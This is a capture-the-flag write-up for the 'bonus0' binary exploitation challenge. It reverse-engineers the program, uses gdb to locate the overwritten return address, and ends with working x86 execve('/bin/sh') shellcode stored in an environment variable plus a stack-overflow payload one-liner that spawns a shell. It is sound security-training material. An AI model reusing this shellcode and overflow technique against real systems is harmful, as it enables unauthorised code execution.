## FlagBonus0 README: Finding FlagBonus0
LE = little Endian

So we have 2 function p and pp and our main function.

**Main**
Create a buf of size 42
Call pp with our buff
and then call puts

**pp**
allocate 2 buffer src with 20 space and v3 with 28 spaces
call p with src and call p with v3.
copy src to the dest.
then add at the end this adress : 0x080486A4
return concatenation of dest and v3

**p**
allocate 4104 buffer and read stdin to the size 4096. Search for \n and replace it with \0 and copy what we have read for 20 caracteres in our param.

So let's try to put some value and inspect the stack :

(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Single stepping until exit from function main,
which has no line number information.
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
Warning:
Cannot insert breakpoint 0.
Error accessing memory address 0x42424242: Input/output error.

0x42424242 in ?? ()


and we segfault with the second arguments. Let's try to find where :

Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09

Breakpoint 2, 0x0804855e in pp ()
(gdb) s
Single stepping until exit from function pp,
which has no line number information.

Breakpoint 1, 0x0804859d in pp ()
(gdb) s
Single stepping until exit from function pp,
which has no line number information.
0x080485b9 in main ()
(gdb) s
Single stepping until exit from function main,
which has no line number information.
AAAAAAAAAAAAAAAAAAAAaA00aA01aA02aA03aA04��� aA00aA01aA02aA03aA04���
Warning:
Cannot insert breakpoint 0.
Error accessing memory address 0x61333041: Input/output error.

0x61323041 in ?? ()
0x61323041 in text = a20A in LE so in normal it's A02a

So we figure it's 9 element after our input that we segfault. Now we can try to put an adress that will execute the shell.

To do that we are going to create a var env that will have our shellcode:
```Bash
export shellcode="`python -c 'print("\x90" * 30 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`"
```

we now need to find what's the adress for that we are going to use the getenv func and print his ptr.See env_variable_finder.c.
and for me here is the adress : 0xbfffff01 (in LE \x01\xff\xff\xbf).

So let's try to put many car we want as the first input and then 8 random char + \x01\xff\xff\xbf as our second input. Then cat it to let bash open.

To do that in bash it will look like this
```Bash
(python -c 'print("A" * 30)'; python -c 'print("B" * 9 + "\x01\xff\xff\xbf" + "A02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09")'; cat) | ./bonus0
```

and let s go we have our bash.
